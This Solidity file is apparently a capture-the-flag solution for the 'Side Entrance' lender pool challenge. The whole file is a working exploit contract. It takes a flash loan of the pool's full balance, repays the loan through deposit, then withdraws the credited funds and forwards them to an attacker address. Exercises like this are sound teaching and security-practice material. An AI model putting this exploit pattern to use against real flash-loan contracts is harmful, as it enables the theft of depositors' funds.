// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract AttackHelper {
    SideEntranceLenderPool private _pool;
    address payable private _attacker;

    constructor(address pool, address payable attacker) {
        _pool = SideEntranceLenderPool(pool);
        _attacker = attacker;
    }

    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }

    function attack() external {
        require(msg.sender == _attacker, "Just attacker");

        uint256 amountToSteal = address(_pool).balance;
        _pool.flashLoan(amountToSteal);

        // AttackHelper now has balance
        _pool.withdraw();
    }

    receive() external payable {
        (bool success, ) = _attacker.call{value: msg.value}("");
        require(success, "Couldn't give money to attacker");
    }
}
